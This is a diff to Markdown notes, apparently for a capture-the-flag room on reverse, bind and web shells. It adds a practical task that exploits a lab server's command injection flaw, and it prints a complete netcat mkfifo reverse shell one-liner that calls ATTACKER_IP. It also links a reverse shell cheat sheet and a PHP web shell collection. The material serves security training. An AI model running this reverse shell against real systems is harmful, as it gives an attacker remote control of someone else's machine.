@@ -75,7 +75,7 @@ nc -lvnp 443
 
 ## Gaining Reverse Shell Access
 
-Once the listener is ready, the attacker needs to **execute a reverse shell payload** on the victim machine.
+Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There’s a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
 ### Example Payload: Pipe Reverse Shell
 ```bash
@@ -462,3 +462,23 @@ Here are some widely used web shells written in PHP, often used by attackers for
 
 You can find more web shells at: https://www.r57shell.net/index.php. 
 
+---
+# Practical Task
+
+let’s get the flag in the format THM{} from the vulnerable web server. Click on the Start Machine button to start the challenge. After that, it will be accessible on the following URLs:
+
+- 10.10.170.217:8080 hosts the landing page
+- 10.10.170.217:8081 hosts the web application that is vulnerable to command injection.
+- 10.10.170.217:8082 hosts the web application that is vulnerable to an unrestricted file upload.
+
+
+## Answer the questions below
+
+**Q1. Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?**
+
+- Go to the landing page located on `10.10.170.217:8080` then click on Reverse/Bind task
+- ![image](https://github.com/user-attachments/assets/77a32e23-3ec5-4bfa-8bbc-fe1b05816f74)
+- set the netcat listener to listen for incoming connection
+- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+
+Ans: *** ***
